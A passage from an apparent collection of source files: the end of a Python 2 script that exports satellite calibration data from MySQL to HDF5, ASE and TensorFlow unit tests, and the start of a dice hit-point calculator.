hfile.create_dataset('obs_bt8', data = data_1month[:, 18].astype(numpy.int))\n            hfile.create_dataset('obs_bt9', data = data_1month[:, 19].astype(numpy.int))\n            hfile.create_dataset('obs_bt10', data = data_1month[:, 20].astype(numpy.int))\n            hfile.create_dataset('obs_bt11', data = data_1month[:, 21].astype(numpy.int))\n            hfile.create_dataset('obs_bt12', data = data_1month[:, 22].astype(numpy.int))\n            hfile.create_dataset('obs_bt13', data = data_1month[:, 23].astype(numpy.int))\n            hfile.create_dataset('obs_bt14', data = data_1month[:, 24].astype(numpy.int))\n            hfile.create_dataset('obs_bt15', data = data_1month[:, 25].astype(numpy.int))\n            hfile.create_dataset('rttov_bt1', data = data_1month[:, 26].astype(numpy.int))\n            hfile.create_dataset('rttov_bt2', data = data_1month[:, 27].astype(numpy.int))\n            hfile.create_dataset('rttov_bt3', data = data_1month[:, 28].astype(numpy.int))\n            hfile.create_dataset('rttov_bt4', data = data_1month[:, 29].astype(numpy.int))\n            hfile.create_dataset('rttov_bt5', data = data_1month[:, 30].astype(numpy.int))\n            hfile.create_dataset('rttov_bt6', data = data_1month[:, 31].astype(numpy.int))\n            hfile.create_dataset('rttov_bt7', data = data_1month[:, 32].astype(numpy.int))\n            hfile.create_dataset('rttov_bt8', data = data_1month[:, 33].astype(numpy.int))\n            hfile.create_dataset('rttov_bt9', data = data_1month[:, 34].astype(numpy.int))\n            hfile.create_dataset('rttov_bt10', data = data_1month[:, 35].astype(numpy.int))\n            hfile.create_dataset('rttov_bt11', data = data_1month[:, 36].astype(numpy.int))\n            hfile.create_dataset('rttov_bt12', data = data_1month[:, 37].astype(numpy.int))\n            hfile.create_dataset('rttov_bt13', data = data_1month[:, 38].astype(numpy.int))\n            hfile.create_dataset('rttov_bt14', data = data_1month[:, 39].astype(numpy.int))\n            hfile.create_dataset('rttov_bt15', data = data_1month[:, 40].astype(numpy.int))\n            hfile.create_dataset('rttov_nwp_begin_t', data = data_1month[:, 37].astype(numpy.double))\n            hfile.create_dataset('rttov_nwp_begin_coef', data = data_1month[:, 38].astype(numpy.float))\n            hfile.create_dataset('rttov_nwp_end_t', data = data_1month[:, 39].astype(numpy.double))\n            hfile.create_dataset('rttov_nwp_end_coef', data = data_1month[:, 40].astype(numpy.float))\n            hfile.create_dataset('crtm_bt1', data = data_1month[:, 26].astype(numpy.int))\n            hfile.create_dataset('crtm_bt2', data = data_1month[:, 27].astype(numpy.int))\n            hfile.create_dataset('crtm_bt3', data = data_1month[:, 28].astype(numpy.int))\n            hfile.create_dataset('crtm_bt4', data = data_1month[:, 29].astype(numpy.int))\n            hfile.create_dataset('crtm_bt5', data = data_1month[:, 30].astype(numpy.int))\n            hfile.create_dataset('crtm_bt6', data = data_1month[:, 31].astype(numpy.int))\n            hfile.create_dataset('crtm_bt7', data = data_1month[:, 32].astype(numpy.int))\n            hfile.create_dataset('crtm_bt8', data = data_1month[:, 33].astype(numpy.int))\n            hfile.create_dataset('crtm_bt9', data = data_1month[:, 34].astype(numpy.int))\n            hfile.create_dataset('crtm_bt10', data = data_1month[:, 35].astype(numpy.int))\n            hfile.create_dataset('crtm_bt11', data = data_1month[:, 36].astype(numpy.int))\n            hfile.create_dataset('crtm_bt12', data = data_1month[:, 37].astype(numpy.int))\n            hfile.create_dataset('crtm_bt13', data = data_1month[:, 38].astype(numpy.int))\n            hfile.create_dataset('crtm_bt14', data = data_1month[:, 39].astype(numpy.int))\n            hfile.create_dataset('crtm_bt15', data = data_1month[:, 40].astype(numpy.int))\n            hfile.create_dataset('crtm_nwp_begin_t', data = data_1month[:, 41].astype(numpy.double))\n            hfile.create_dataset('crtm_nwp_begin_coef', data = data_1month[:, 42].astype(numpy.float))\n            hfile.create_dataset('crtm_nwp_end_t', data = data_1month[:, 43].astype(numpy.double))\n            hfile.create_dataset('crtm_nwp_end_coef', data = data_1month[:, 44].astype(numpy.float))\n            \n            \n            hfile.close()\n            \n        \n        \n        \n        #cur.execute(begin_sql_3day)\n        begin_data = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        # do NOT exit in thread!! To avoid zombie process.\n        #print sql_3day\n        #print \"------------------\"\n        #print sql_1month\n        #print \"------------------\"\n        #print sql_3day_calc\n        #print \"------------------\"\n        #print sql_1month_calc\n        #print \"------------------\"\n        #print begin_sql_3day\n        #print \"------------------\"\n        msg = '??draw obc 2-dim png`Mysql Fatal Error[' + str(e.args[0]) \\\n            + ']: ' + e.args[1] \n        print msg             \n        common.err(my_log, log_tag, inputdate + msg)\n        return False\n    \n \n   \n\n    \n    \n\n#     \n#     get_obc_txt(tmpfile1year,tmpfilelife,'cold_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'hot_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'earth_ang_minus')\n#     get_obc_txt(tmpfile1year,tmpfilelife,'scan_prd')\n    \n\n    \n    \n    # trans txt result to numpy fmt, to easy hdf create.\n    \n    \n    \n    \n    \n\n     # w: rewrite if hdf already exist.\n    \n    \n    #ret = create_obc_hdf('1month',hfile,data_1month, ins_conf.obc_to_db.values())\n    \n\n    \n    #hfile.create_dataset(\"time_3day\", data = ymdh_arr.astype(numpy.int32)) \n\n    \n\n    #if not ret:\n        #return False\n\n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_1month_calc[:, 0]) )\n#     hfile.create_dataset(\"time_1month_calc\", data = ymdh_arr.astype(numpy.int32))\n#     #hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1]*0.001.astype(numpy.int32))\n#     hfile.create_dataset('cold_ang_minus_1month_calc',data=data_1month_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_1month_calc',data=data_1month_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_1month_calc',data=data_1month_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_1month_calc',data=data_1month_calc[: ,4].astype(numpy.float32))\n#     #ret = create_obc_hdf('1month_calc',hfile,data_1month, ins_conf.calc_to_db.values())\n# \n#     ymdh_arr = numpy.array(map(common.time_to_arr, data_3day_calc[:, 0]) )\n#     hfile.create_dataset(\"time_3day_calc\", data = ymdh_arr.astype(numpy.int32)) \n#     hfile.create_dataset('cold_ang_minus_3day_calc',data=data_3day_calc[: ,1].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('hot_ang_minus_3day_calc',data=data_3day_calc[: ,2].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('earth_ang_minus_3day_calc',data=data_3day_calc[: ,3].astype(numpy.float32)*0.001)\n#     hfile.create_dataset('scan_prd_3day_calc',data=data_3day_calc[: ,4].astype(numpy.float32))\n#         \n#     #ret = create_obc_hdf('3day_calc',hfile,data_3day, ins_conf.calc_to_db.values())\n\n    \n   \n    \n    \n    #sds_len = len(ins_conf.sds_name)\n    #for i in xrange(1, sds_len+1):\n    #    create_1year_hdf(tmpfile1year,tmpfilelife,ins_conf.sds_name[i]['name'],hfile)\n        \n#     \n#     create_1year_hdf(tmpfile1year,tmpfilelife,'cold_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'hot_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'earth_ang_minus',hfile)\n#     create_1year_hdf(tmpfile1year,tmpfilelife,'scan_prd',hfile)\n\n    \n    #return True\n\n    # like: FY3C_MWTS_20140303_0259_TO_20140428_1159_12H_[PRT|INS_TEMP|...]\n    \n\n    return True\n    \ndef draw_obc():\n    #for test!!!!!\n#     if input != 'just_obc':\n#         return\n#     if input != 1:\n#         return\n    #print input\n    ret=draw_just_obc()\n    ret1=draw_one_channel()\n    ret2=draw_t639()\n    \n    #if input == 'just_obc':\n    #    return draw_just_obc()\n    #else:\n    #    return draw_one_channel(input)\n    if ret==True and ret1==True and ret2==True:\n        return True\n    else:\n        return False\n    \n    \n \ndef main():\n    #global my_channel_table\n    #global my_Calc_channel_table\n    #global my_obc_table\n    #global my_Calc_table\n    global Calc_table_1month \n    global obc_table_1month\n    global channel_table_1month\n    global Calc_channel_table_1month\n    global T639\n    \n    common.wt_file(my_pidfile, str(pid))\n    common.info(my_log, log_tag, inputdate + 'program start')\n\n    # register signal function.\n    signal.signal(signal.SIGTERM, signal_handler)   \n    signal.signal(signal.SIGINT, signal_handler)      \n    \n    # check ps result, kill previous same program, avoiding hang.\n    # we do NOT grep --date=2014-04-27-18 for convenience.\n    cmd = conf.ps + ' -elf | ' + conf.grep + ' ' + conf.bin_path + ' | ' \\\n        + conf.grep + ' -v grep | ' + conf.grep + ' -v tail | ' + conf.grep \\\n        + ' -v bash | ' + conf.grep + ' ' + fname + ' | ' + conf.grep \\\n        + \" '\\-\\-sat=\" + sat + \"' | \" + conf.grep + \" '\\-\\-ins=\" + ins \\\n        + \"' | \" + conf.grep + \" '\\-\\-span=\" + hour_span + \"' | \" \\\n        + conf.awk + \" '{print $4}'\"\n    (status, value) = commands.getstatusoutput(cmd)\n    pid_list = value.split()\n    for one_pid in pid_list:\n        if int(one_pid) != pid:\n            msg = 'more then one prog find, kill old same prog[' + one_pid + ']'\n            common.err(my_log, log_tag, inputdate + msg)\n            cmd = conf.kill + ' -kill ' + one_pid\n            commands.getstatusoutput(cmd)\n    \n    #get the correct tables. we MUST get table name from INFO db, not show tables!!\n    \"\"\"\n    We MUST create fy3b-mwts table's info, for easy time search\n    also, there is a BUG... ...\n    \"\"\"\n    try:\n        conn=MySQLdb.connect(host=conf.db_setting['master']['ip'], \n                             user=conf.db_setting['master']['user'],\n                             passwd=conf.db_setting['master']['pwd'], \n                             port=conf.db_setting['master']['port'])\n        cur=conn.cursor()\n        conn.select_db(conf.table_setting[sat][ins]['data_db'])\n        cur.execute(\"show tables like '%\"+inputdate+\"%';\") # the result is already sorted by ascii.\n        #print \"show tables like '%\"+inputdate+\"%'\"\n        all_tables = cur.fetchall()\n        cur.close()\n        conn.close()\n    except MySQLdb.Error, e:\n        msg = 'Mysql Fatal Error[' + str(e.args[0])+']: '+e.args[1] \n        common.err(my_log, log_tag, inputdate + msg)\n        sys.exit(3)\n        \n    # ignore L1B table.\n    #print all_tables\n    all_obc_table = [ x for x in all_tables if 'OBCXX_MS' in x[0] ]\n    T639=[ x for x in all_tables if '015KM_MS' in x[0] ]\n    Calc_tag = 'OBCXX_MS_CALC'\n    Calc_channel_tag='OBCXX_MS_CALC_'\n    \n    Calc_table = [ x for x in all_obc_table if Calc_tag in x[0]]\n    Calc_channel_table=[ x for x in Calc_table if Calc_channel_tag in x[0]]\n    \n    Calc_channel_table_1month=Calc_channel_table\n    \n    Calc_table =[ x for x in Calc_table if Calc_channel_tag not in x[0]]\n    \n    Calc_table_1month=Calc_table\n    \n    channel_tag = 'OBCXX_MS_' + str(ins_conf.channels)\n    channel_table = [ x for x in all_obc_table if channel_tag in x[0]]\n    channel_table=list(set(channel_table).difference(set(Calc_table)).difference(set(Calc_channel_table)))\n    \n    channel_table_1month=channel_table\n    \n    obc_table = list(set(all_obc_table).difference(set(Calc_table)).difference(set(channel_table)).difference(set(Calc_channel_table))) #return in all_obc_table but no in channel_table\n    #print obc_table\n    #print \"-------------------------\"\n    #print Calc_table\n    #print \"-------------------------\"\n    #print channel_table\n    #print \"-------------------------\"\n    #print Calc_channel_table\n    obc_table_1month=obc_table\n    \n\n\n    \n                \n                \n                \n                \n    print \"-------------------------\"\n    print obc_table_1month\n    #print \"-------------------------\"\n    #print Calc_table_1month\n    #print \"-------------------------\"\n    #print channel_table_1month\n    #print \"-------------------------\"\n    #print Calc_channel_table_1month\n                \n                \n\n######################################################################\n\n    #print obc_table_3day\n    #print \"##########################################\"\n    #print my_obc_table\n    \n    #print channel_table_3day\n#     print channel_table_1month\n    \n    \n    #draw_obc('just_obc')\n    #for channel in range(1,ins_conf.channels+1):\n    #    draw_obc(channel)\n    \n    # create input for thread. 'just_obc' means draw 2-dim obc data\n    # and, 1...13 means draw 3-dim obc data for each channel\n    #pool = Pool()\n    #ret = pool.map(draw_obc, ['just_obc'] + range(1, ins_conf.channels + 1) )\n    #pool.close()\n    #pool.join()\n    ret= draw_obc() \n    if  ret==False:\n        msg = 'FAILED`some png may NOT draw.`timeuse='\n    else:\n        msg = 'SUCC`program finish.`timeuse='\n    \n    timeuse_end = time.time()\n    timeuse = str(round(timeuse_end - timeuse_begin, 2))\n    print msg + timeuse\n    common.info(my_log, log_tag, inputdate + msg + timeuse)\n\nif __name__ == '__main__':\n    main()\n\n", "68": "import pytest\n\nfrom ase.build import bulk\n\n\ndef systems():\n    yield bulk('Si')\n    atoms = bulk('Fe')\n    atoms.set_initial_magnetic_moments([1.0])\n    yield atoms\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.parametrize('atoms', systems(),\n                         ids=lambda atoms: str(atoms.symbols))\n@pytest.mark.calculator('elk', tasks=0, ngridk=(3, 3, 3))\ndef test_elk_bulk(factory, atoms):\n    calc = factory.calc()\n    atoms.calc = calc\n    spinpol = atoms.get_initial_magnetic_moments().any()\n    props = atoms.get_properties(['energy', 'forces'])\n    energy = props['energy']\n\n    # Need more thorough tests.\n    if str(atoms.symbols) == 'Si2':\n        assert energy == pytest.approx(-15729.719246, abs=0.1)\n        assert atoms.get_potential_energy() == pytest.approx(energy)\n\n    # Since this is FileIO we tend to just load everything there is:\n    expected_props = {\n        'energy', 'free_energy', 'forces', 'ibz_kpoints',\n        'eigenvalues', 'occupations'\n    }\n\n    assert expected_props < set(props)\n\n    # TODO move to unittest based on random numbers\n    # This really belongs in a test of the calculator method mixin\n    assert calc.get_fermi_level() == props['fermi_level']\n    assert calc.get_ibz_k_points() == pytest.approx(props['ibz_kpoints'])\n    assert calc.get_k_point_weights() == pytest.approx(props['kpoint_weights'])\n\n    x = slice(None)\n    assert calc.get_eigenvalues(x, x) == pytest.approx(props['eigenvalues'])\n    assert calc.get_occupation_numbers(x, x) == pytest.approx(\n        props['occupations'])\n    assert calc.get_spin_polarized() == spinpol\n    assert calc.get_number_of_spins() == 1 + int(spinpol)\n    assert calc.get_number_of_bands() == props['nbands']\n", "69": "# type: ignore\nimport numpy as np\nfrom ase.cluster.cubic import FaceCenteredCubic\nfrom ase.calculators.turbomole import Turbomole\n\n\ndef test_turbomole_au13():\n    surfaces = [(1, 0, 0), (1, 1, 0), (1, 1, 1)]\n    layers = [1, 2, 1]\n    atoms = FaceCenteredCubic('Au', surfaces, layers, latticeconstant=4.08)\n\n    params = {\n        'title': 'Au13-',\n        'task': 'energy',\n        'basis set name': 'def2-SV(P)',\n        'total charge': -1,\n        'multiplicity': 1,\n        'use dft': True,\n        'density functional': 'pbe',\n        'use resolution of identity': True,\n        'ri memory': 1000,\n        'use fermi smearing': True,\n        'fermi initial temperature': 500.,\n        'fermi final temperature': 100.,\n        'fermi annealing factor': 0.9,\n        'fermi homo-lumo gap criterion': 0.09,\n        'fermi stopping criterion': 0.002,\n        'scf energy convergence': 1.e-4,\n        'scf iterations': 250\n    }\n\n    calc = Turbomole(**params)\n    atoms.calc = calc\n    calc.calculate(atoms)\n\n    # use the get_property() method\n    assert np.isclose(calc.get_property('energy'), -48044.567169, atol=1e-4)\n    dipole = calc.get_property('dipole')\n    dipole_ref = [1.68659890e-09, 1.17584764e-09, -1.45238506e-09]\n    assert np.allclose(dipole, dipole_ref, rtol=0.01)\n\n    # test restart\n\n    params = {\n        'task': 'gradient',\n        'scf energy convergence': 1.e-6\n    }\n\n    calc = Turbomole(restart=True, **params)\n    assert calc.converged\n    calc.calculate()\n\n    assert np.isclose(calc.get_property('energy'), -48044.567179, atol=1e-5)\n    force = np.linalg.norm(calc.get_property('forces'))\n    force_ref = 0.27110367946343794\n    assert np.isclose(force, force_ref, rtol=0.01)\n    dipole = calc.get_property('dipole')\n    dipole_ref = [5.97945377e-09, 2.72637920e-09, -3.68399945e-09]\n    assert np.allclose(dipole, dipole_ref, rtol=0.01)\n", "70": "import pytest\nimport numpy as np\nfrom ase.build import bulk, molecule\nfrom ase.units import Hartree\n\n\ncalc = pytest.mark.calculator\n\nrequired_quantities = {'eigenvalues',\n                       'fermilevel',\n                       'version',\n                       'forces',\n                       'energy',\n                       'free_energy',\n                       'stress',\n                       'ibz_kpoints',\n                       'kpoint_weights'}\n\n\ndef run(atoms):\n    atoms.get_forces()\n    print(sorted(atoms.calc.results))\n    for key, value in atoms.calc.results.items():\n        if isinstance(value, np.ndarray):\n            print(key, value.shape, value.dtype)\n        else:\n            print(key, value)\n\n    for name in required_quantities:\n        assert name in atoms.calc.results\n\n    return atoms.calc.results\n\n\n@pytest.mark.calculator_lite\n@calc('abinit')\n@calc('abinit', v8_legacy_format=False)\ndef test_si(factory):\n    atoms = bulk('Si')\n    atoms.calc = factory.calc(nbands=4 * len(atoms), kpts=[4, 4, 4])\n    run(atoms)\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.parametrize('pps', ['fhi', 'paw'])\n@calc('abinit')\ndef test_au(factory, pps):\n    atoms = bulk('Au')\n    atoms.calc = factory.calc(\n        pps=pps,\n        nbands=10 * len(atoms),\n        tsmear=0.1,\n        occopt=3,\n        kpts=[2, 2, 2],\n        pawecutdg=6.0 * Hartree,\n    )\n    # Somewhat awkward to set pawecutdg also when we are not doing paw,\n    # but it's an error to pass None as pawecutdg.\n    run(atoms)\n\n\n@pytest.fixture\ndef fe_atoms(abinit_factory):\n    atoms = bulk('Fe')\n    atoms.set_initial_magnetic_moments([1])\n    calc = abinit_factory.calc(nbands=8,\n                               kpts=[2, 2, 2])\n    atoms.calc = calc\n    return atoms\n\n\ndef test_fe_fixed_magmom(fe_atoms):\n    fe_atoms.calc.set(spinmagntarget=2.3)\n    run(fe_atoms)\n\n\n@pytest.mark.calculator_lite\ndef test_fe_any_magmom(fe_atoms):\n    fe_atoms.calc.set(occopt=7)\n    run(fe_atoms)\n\n\n@calc('abinit')\ndef test_h2o(factory):\n    atoms = molecule('H2O', vacuum=2.5)\n    atoms.calc = factory.calc(nbands=8)\n    run(atoms)\n\n\n@calc('abinit')\ndef test_o2(factory):\n    atoms = molecule('O2', vacuum=2.5)\n    atoms.calc = factory.calc(nbands=8, occopt=7)\n    run(atoms)\n    magmom = atoms.get_magnetic_moment()\n    assert magmom == pytest.approx(2, 1e-2)\n    print('magmom', magmom)\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manykpts(factory):\n    atoms = bulk('Au') * (2, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.symbols[:2] = 'Cu'\n    atoms.calc = factory.calc(nbands=len(atoms) * 7, kpts=[8, 8, 8])\n    run(atoms, 'manykpts')\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manyatoms(factory):\n    atoms = bulk('Ne', cubic=True) * (4, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.calc = factory.calc(nbands=len(atoms) * 5)\n    run(atoms, 'manyatoms')\n", "71": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "72": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "73": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "74": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "75": "#! python3\n\nimport math\nimport random\nimport re\n\nhit_dice_regex = re.compile(r'([+/-]*[\\d]*[d,D][\\d]{1,2}|[+/-]*\\d+)')\n\n\ndef get_health(_hit_dice, f):\n    hd = hit_dice_regex.findall(_hit_dice.lower())\n    dice = []\n    nums = []\n    for i in hd:\n        if 'd' in i:\n            die = i.split('d')\n            if die[0] in ('', '+', '-'):\n                die[0] = die[0] + '1'\n            dice.append(list(map(int, die)))\n        else:\n            nums.append(int(i))\n    nums.extend(f(dice))\n    print('The monster has ' + str(sum(nums)) + ' hit points.')\n\n\ndef calc_average_health(dice):  # 1/2 die value rounded down for every roll\n    return list(map(__calc_average_health, dice))\n\n\ndef __calc_average_health(die):\n    avg_health = math.floor((die[1] / 2) * die[0])\n    return avg_health\n\n\ndef calc_max(dice):  # Max die value for every roll.\n    return list(map(__calc_max, dice))\n\n\ndef __calc_max(die):\n    max_health = die[0] * die[1]\n    return max_health\n\n\ndef calc_min(dice):  # Min die value for every roll.\n    return list(map(__calc_min, dice))\n\n\ndef __calc_min(die):\n    min_health = die[0]\n    return min_health\n\n\ndef calc_pc_average(dice):  # Max die value for first HD, 1/2 die value rounded down for every other roll.\n    return __calc_pc_rules(dice, calc_average_health)\n\n\ndef __calc_pc_rules(dice, f):\n    avg_pc = [dice[0][1]]\n    dice[0][0] -= 1\n    avg_pc.append(sum(f(dice)))\n    return avg_pc\n\n\ndef calc_pc_roll_health(dice):  # Max die value for first HD, randomly rolled for every other roll.\n    return __calc_pc_rules(dice, calc_random_health)\n\n\ndef calc_pc_suggested_health(dice):  # Max die value for 